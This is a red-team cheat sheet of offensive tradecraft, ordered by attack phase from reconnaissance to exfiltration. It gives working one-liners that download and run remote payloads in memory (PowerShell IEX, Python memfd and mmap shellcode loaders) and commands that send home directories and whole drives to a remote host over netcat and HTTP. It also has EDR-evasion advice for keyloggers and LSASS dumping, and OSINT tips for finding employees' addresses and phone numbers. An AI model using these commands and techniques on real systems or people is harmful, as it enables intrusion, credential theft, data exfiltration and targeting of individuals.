# Offensive Security Notes: Unredacted  
**Be advised: hot takes ahead. These are the things people don’t say out loud.**

## Guides 
https://web.archive.org/web/20221126165225/https://scund00r.com/all/oscp/2018/02/25/passing-oscp.html#enumeration
https://kolegite.com/EE_library/books_and_lectures/%D0%9A%D0%B8%D0%B1%D0%B5%D1%80%D1%81%D0%B8%D0%B3%D1%83%D1%80%D0%BD%D0%BE%D1%81%D1%82/RTFM%20Red%20Team%20Field%20Manual%20v2%20--%20Ben%20Clark%20%26%20Nick%20Downer.pdf
https://paper.bobylive.com/Security/The_Red_Team_Guide_by_Peerlyst_community.pdf

- [OSINT](#osint)  
- [External Recon](#external-recon)  
- [Malware Development](#malware-development)  
- [Initial Access](#initial-access)  
- [Execution](#execution)  
- [Defense Evasion](#defense-evasion)  
- [Command & Control](#command--control) 
- [Privilege Escalation](#privilege-escalation)   
- [Credential Access](#credential-access)  
- [Lateral Movement](#lateral-movement)  
- [Exfiltration](#exfiltration)  

---

## OSINT

<table>
  <tr><td>LinkedIn</td><td>Can Filter by company and it shows employees, also even shows people based on type of degree (allows you to profile targets) - Can use VPN and dummy account</td></tr>
  <tr><td>Employee Collection</td><td>Most companies use gmail and outlook. Also most employee emails are first.lastname@domain.com,firstname@domain.com, or -lastname-first_initial-second_initial@domain.com. Even if you get preferred names from LinkedIn you can use sites like TruePeopleSearch to get full names, phone numbers, and addresses. You can also use IDCrawl to find social media accounts.</td></tr>
  <tr><td>Targeting</td><td>Can build a mind map on individuals, including prioritization of targeting. I’ll figure out how to word what I want here. Most of it doesn't apply to "red team" since there is no real hacking. It apply to actual technqiues to exploit individuals.</td></tr>
</table>

---

## External Recon

<table>
  <tr>
    <td>Protocol Recon via Packet Grep</td>
    <td>
      <pre><code>sudo ngrep -i -d &lt;network interface&gt; 's.?a.?m.?b.?a.*[[:digit:]]' port 139
smbclient -U '%' -N -L \\\\10.10.10.10\\</code></pre>
    </td>
  </tr>
  <tr>
    <td>Using Shodan to Retrieve Open Ports and Info</td>
    <td>
      <pre><code>nmap -sn -Pn -n --script=shodan-api --script-args 'shodan-api.apikey=XXXXXX' worldsworstwebsiteever.com</code></pre>
    </td>
  </tr>
  <tr>
    <td>Firewall Evasion</td>
    <td>
      <a href="https://github.com/kritikakatyal/Firewall-Evasion-Techniques-Analysis" target="_blank">Firewall Evasion Techniques</a>
    </td>
  </tr>
</table>

## Malware Development

<table>
  <tr>
    <td><b>Compile C++ with cl.exe</b></td>
    <td>
      <pre><code>cl.exe /nologo /MT /Ox /W0 /GS- /EHs- /GR- /DNDEBUG /Tp bubble_sort.cpp /link kernel32.lib /OUT:bubble_sort.exe /SUBSYSTEM:WINDOWS /MACHINE:x64 /ENTRY:WinMain /NODEFAULTLIB /MERGE:.rdata=.text /MERGE:.pdata=.text /MERGE:.data=.text</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Compile assembly with MASM</b></td>
    <td>
      <pre><code>ml64 /c syscalls.asm /Fo syscalls.obj</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Compile C# with csc.exe</b></td>
    <td>
      <pre><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /optimize+ /debug- .\data_recovery.cs</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Compile C# with Roslyn Compiler</b></td>
    <td>
      <pre><code>& "C:\Program Files\Microsoft Visual Studio\2022\Community\MSBuild\Current\Bin\Roslyn\csc.exe" /optimize+ /unsafe /debug- .\program.cs .\Structs.cs</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Publish .NET Application</b></td>
    <td>
      <pre><code>dotnet publish -c Release -r win-x64 --self-contained /p:PublishSingleFile=true /p:PublishTrimmed=true /p:EnableCompressionInSingleFile=true</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Convert COM Type Library to .NET Assembly</b></td>
    <td>
      <pre><code>tlbimp C:\Windows\System32\wsmauto.dll /out:WSManAutomation.dll</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Add Reference to .NET Project</b></td>
    <td>
      <pre><code>dotnet add reference WSManAutomation.dll</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>FreeBSD Cross-Compile with Clang</b></td>
    <td>
      <pre><code>clang --target=x86_64-unknown-freebsd12.2 --sysroot=/root/cross_compiler/freebsd-12.2-sysroot -I/root/cross_compiler/freebsd-12.2-sysroot/usr/include -L/root/cross_compiler/freebsd-12.2-sysroot/usr/lib -o shell shell.c -fPIC</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Writing Shellcode for Windows x64</b></td>
    <td>
      <p>Source: <a href="https://nytrosecurity.com/2019/06/30/writing-shellcodes-for-windows-x64/">Nytro Security Blog</a></p>
    </td>
  </tr>
  <tr>
    <td><b>Writing Stage 0 for Windows x64</b></td>
    <td>
      <p>Source: <a href="https://github.com/ahmedkhlief/Ninja/blob/master/core/agents/cmd_shellcodex64.ninja">GitHub - Ninja Shellcode</a></p>
    </td>
  </tr>
  <tr>
    <td><b>Assembler to Write Windows Assembly</b></td>
    <td>
      <p>Online tool to convert x86/x64 assembly into raw shellcode bytes. Supports Intel syntax and includes disassembly features.</p>
      <p>Tool: <a href="https://defuse.ca/online-x86-assembler.htm">Defuse Online Assembler</a></p>
    </td>
  </tr>
  <tr>
  <td><b>Windows Functions for Code Execution</b></td>
  <td>
    <a href="http://ropgadget.com/posts/abusing_win_functions.html">Abusing native Windows functions for shellcode execution</a></p>
    <a href="https://github.com/nettitude/Tartarus-TpAllocInject/tree/main">Modern syscall lookup and thread pool execution</a></p>
  </td>
</tr>

</table>


---

## Initial Access

<table>
    <tr>
    <td>Phishing/Smishing</td>
    <td>
      <a href="https://medium.com/sud0root/mastering-modern-red-teaming-infrastructure-part-7-advanced-phishing-techniques-for-2fa-bypass-85f9adc4dc3b" target="_blank">Medium: Advanced Phishing Techniques for 2FA Bypass</a>,  
      MFA becoming more popular and companies usually only give higher-ups phones. This means most employees use their personal phones.
    </td>
    </tr>
  <tr><td>MOTW bypass</td><td>tar.gz bypasses motw and can be extraced with 7-zip. CrowdStrike flags on using tar from windows due to lolbin</td></tr>
  <tr>
    <td>Excel</td>
    <td>
      <a href="https://github.com/mttaggart/xllrs" target="_blank"> Rust XLL</a>
      Microsoft blocks macros in documents originating from the internet (email AND web download), XLL (Excel Add-Ins) are dlls loaded by Excel. Still get warning for no signature. Need legitimate code signing certificate to avoid this.
    </td>
    </tr>
    <tr>
    <td>Supply Chain</td>
    <td>
      <a href="https://github.com/0x-Apollyon/Malicious-VScode-Extension" target="_blank">VS Code Plugin </a> -
      I have seen many developers trust and install plugins that come from the Visual Studio code marketplace. <a href="https://www.bleepingcomputer.com/news/security/malicious-vscode-extensions-with-millions-of-installs-discovered/" target="_blank"> - Israeli researchers target Darcula plugin</a>
    </td>
    </tr>
    <tr>
    <td>WAF</td>
    <td>
      <a href="https://github.com/botesjuan/Obfuscating-Techniques-WAF-Bypass" target="_blank">Obfuscation Tricks</a>
    </td>
    </tr>
  <tr>
    <td>Routers</td>
    <td>
      Will fill in, but popping these is how nation-states get in.
    </td>
    </tr>
    <tr>
  <td>Insecure Deserialization</td>
  <td>
    <a href="https://www.youtube.com/watch?v=t-zVC-CxYjw" target="_blank">Insecure Deserialization Explained</a>
  </td>
</tr>

</table>

---

## Execution

<table>
  <tr>
    <td><b>PowerUp in Memory (CMD)</b></td>
    <td>
      <pre><code>echo IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/PowerUp.ps1') | powershell -noprofile -</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>PowerUp in Memory (PowerShell)</b></td>
    <td>
      <pre><code>wget('http://10.10.10.10/PowerUp.ps1') -UseBasicParsing | iex</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Python3 ELF In-Memory (No Params)</b></td>
    <td>
      <pre><code>python3.7 -c 'import os, urllib.request; d=urllib.request.urlopen("http://10.10.0.103/test.exe"); fd=os.memfd_create("foo"); os.write(fd,d.read()); p=f"/proc/self/fd/{fd}"; os.execve(p, [p], {})'</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Python3 ELF In-Memory (With Params)</b></td>
    <td>
      <pre><code>python3 -c 'import os; import urllib.request; d = urllib.request.urlopen("https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/nmap?raw=true"); fd = os.memfd_create("foo"); os.write(fd, d.read()); p = f"/proc/self/fd/{fd}"; os.execve(p, [p,"-Pn", "-n", "127.0.0.1"], {})'</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Python2 Shellcode Execution</b></td>
    <td>
      <pre><code>/usr/bin/python -c 'import urllib2,mmap,ctypes;d=urllib2.urlopen("http://10.10.10.10/a").read();m=mmap.mmap(-1,len(d),34,7);m.write(d);ctypes.CFUNCTYPE(None)(ctypes.addressof(ctypes.c_char.from_buffer(m)))()'</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Python2 Temp ELF Execution</b></td>
    <td>
      <pre><code>/usr/bin/python -c 'import os,urllib2,tempfile;d=urllib2.urlopen("http://10.10.10.10/config").read();f=tempfile.NamedTemporaryFile(delete=False);f.write(d);f.close();os.chmod(f.name,0755);os.execve(f.name,[f.name,"-pthread"],{})'</code></pre>
    </td>
  </tr>
</table>


## Command & Control

<table>
  <tr><td><b>Subcategory</b></td><td><b>Description / Notes</b></td></tr>
  <tr><td>Beacon Profiles</td><td>Low-and-slow configs, jitter tuning, domain fronting tricks</td></tr>
  <tr><td>Frameworks & Custom Tooling</td><td>Cobalt Strike, Sliver, custom implants, OPSEC-safe builds</td></tr>
  <tr><td>Infrastructure Setup</td><td>Redirectors, staging servers, domain blending, TLS fingerprinting</td></tr>
</table>

---

## Credential Access

## Credential Access

<table>
  <tr><td><b>Subcategory</b></td><td><b>Description / Notes</b></td></tr>
  <tr><td>Browser Credential Theft</td><td><a href="https://github.com/djhohnstein/SharpChromium">SharpChromium</a> – .NET 4.0 CLR project to retrieve Chromium data such as cookies, history, and saved logins</td></tr>
  <tr><td>NetNTLM Hash Leaks</td><td><a href="https://www.securify.nl/en/blog/living-off-the-land-stealing-netntlm-hashes/"> Stealing Hashes with Responder</a> - SMB signing is enabled by default only on Domain Controllers; Windows endpoints must manually enable it. UNC path internet shortcuts can leak NetNTLM hashes simply by being viewed. In Active Directory environments, it's common to have domain fileshares accessible by many endpoints. Dropping .url on a share with many files is a common tactic. Even with SMB signing enabled, this does not prevent hash leaks via WebDAV or HTTP if a user clicks an internet shortcut or views the link.</td></tr>
 <tr><td>Keyloggers</td><td><a href="https://github.com/d1rkmtrr/TakeMyRDP">RDP session hijacking</a> – Keyloggers are another method for capturing cleartext credentials. RDP is still commonly used within internal networks, and a frequent scenario where this attack applies is when users log into jump boxes via Remote Desktop. The tool performs keyboard hooking only when the user is focused on a Remote Desktop session, making it more stealthy than generic keyloggers that hook the keyboard continuously and record everything typed. However, it remains memory-intensive. A tip for optimizing keyloggers is adding a millisecond delay at the end of each hooking procedure to reduce CPU usage. It's also best to store captured characters in in-memory buffers rather than writing to disk. Logging should occur over the current C2 session comms. This code would be best optimized and utilized as a BOF.</td></tr>
<tr><td>LSASS Dumping</td><td><a href="https://github.com/wtechsec/LSASS-Forked-Dump---Bypass-EDR-CrowdStrike/tree/main">LSASS-Forked-Dump</a> – Overall, I am not a fan of LSASS dumping; I think it is an extreme opsec hazard for little reward. In big company networks, I usually only see regular user accounts on endpoint machines. It’s safer just to force a NetNTLM hash leak than to dump LSASS to get NTLM. Yes, cracking is easier for NTLM, but NetNTLM also uses a weak cryptographic algorithm, so a modern GPU rig with Hashcat will eventually crack it. Also, elite bigger companies use temporary DA accounts that are not housed on the user's Windows box but on a separate virtual machine that you have to log into. Seeing DA accounts on operational servers for less-secure companies is still common. I highly doubt the code in that link bypasses CrowdStrike, but the fundamentals of forking and dumping from a non-main process is a good principle. I would also add that after doing the dump, you should overwrite the MDMP header and avoid saving it to disk. This is another example of code that should be implemented as a BOF file or .NET assembly that can be run in memory, with the dump directly transferred over the wire.</td></tr>
</table>

---

## Lateral Movement

<table>
  <tr><td><b>Subcategory</b></td><td><b>Description / Notes</b></td></tr>
  <tr><td>Remote Execution</td><td>WMI, PSRemoting, scheduled tasks, service creation</td></tr>
  <tr><td>Credential Reuse</td><td>Pass-the-Hash, Pass-the-Ticket, Kerberoasting, plaintext creds</td></tr>
  <tr><td>AD / Identity Abuse</td><td>ACL abuse, shadow admin paths, group membership manipulation</td></tr>
</table>

---

## Privilege Escalation

<table>
  <tr>
    <td>Windows POCs</td>
    <td>
      <a href="https://github.com/ycdxsb/WindowsPrivilegeEscalation" target="_blank">Windows POCs</a>  
    </td>
  </tr>
  <tr>
    <td>BOF Driver Exploit</td>
    <td>
      <a href="https://github.com/apkc/CVE-2024-26229-BOF/tree/main" target="_blank">BOF kernel exploit example</a>  
      Overwriting the EPROCESS structure, specifically the token field with a SYSTEM token, is a common privilege escalation method; however, it is not considered OPSEC safe. CrowdStrike will receive ObRegisterCallback in the kernel and flag it as token access manipulation.
    </td>
  </tr>
  <tr>
    <td>UAC Bypass</td>
    <td>
      <a href="https://github.com/sexyiam/UAC-Bypass/tree/main" target="_blank">UAC-Bypass</a>  
      Many companies still have user accounts that are local administrators for their machine. 
    </td>
  </tr>
  <tr>
    <td>SeImpersonation</td>
    <td>
      <a href="https://github.com/tylerdotrar/SigmaPotato" target="_blank">SigmaPotato</a>  
      In Windows, web servers and database services often inherit the SeImpersonatePrivilege by default. Microsoft has stated that elevating from a Local Service process (with SeImpersonate) to SYSTEM is "expected behavior" — making this a non-patchable issue.
    </td>
  </tr>
  <tr>
    <td>In-depth AD Exploitation</td>
    <td>
      <a href="https://zer1t0.gitlab.io/posts/attacking_ad/" target="_blank">Attacking Active Directory</a>  
    </td>
  </tr>
  <tr>
    <td>Common AD Exploitation Techniques</td>
    <td>
      <a href="https://en.hackndo.com/" target="_blank">Hackndo Blog</a>
    </td>
  </tr>
  <tr>
    <td>ADCS Exploitation Techniques</td>
    <td>
      <a href="https://hideandsec.sh/books/cheatsheets-82c/page/active-directory-certificate-services" target="_blank">ADCS Cheatsheet</a>
    </td>
  </tr>
</table>


---

<table>
  <tr>
    <td><b>Exfil via Embedded Linux</b></td>
    <td>
      <pre><code>nc -l -p 1234 | tar xf -
tar cf - /home/debian | nc 10.10.10.10 1234</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Exfil via SMB</b></td>
    <td>
      <pre><code>smbclient \\\\10.10.10.10\\share -p &lt;Port&gt; -N -Tc share.tar
tar xf share.tar -C share</code></pre>
    </td>
  </tr>
  <tr>
    <td><b>Exfil via PowerShell to Flask Upload Server</b></td>
    <td>
      <pre><code>$files = Get-ChildItem -Path "S:\" -Recurse -File
foreach ($file in $files) {
    $body = [System.IO.File]::ReadAllBytes($file.FullName)
    Invoke-WebRequest -Uri "http://10.10.10.10/upload" -Method POST -Body $body -Headers @{"Filename" = $file.Name}
}</code></pre>
      <p><i>Linux box run:</i></p>
      <pre><code>pip3 install flask</code></pre>
      <pre><code># upload_server.py
from flask import Flask, request
app = Flask(__name__)

@app.route('/upload', methods=['POST'])
def upload():
    f = request.files['file']
    f.save(f.filename)
    return 'File uploaded successfully'

app.run(host='0.0.0.0', port=80)</code></pre>
      <p><i>Run with:</i><br><code>sudo python3 upload_server.py</code></p>
    </td>
  </tr>
</table>
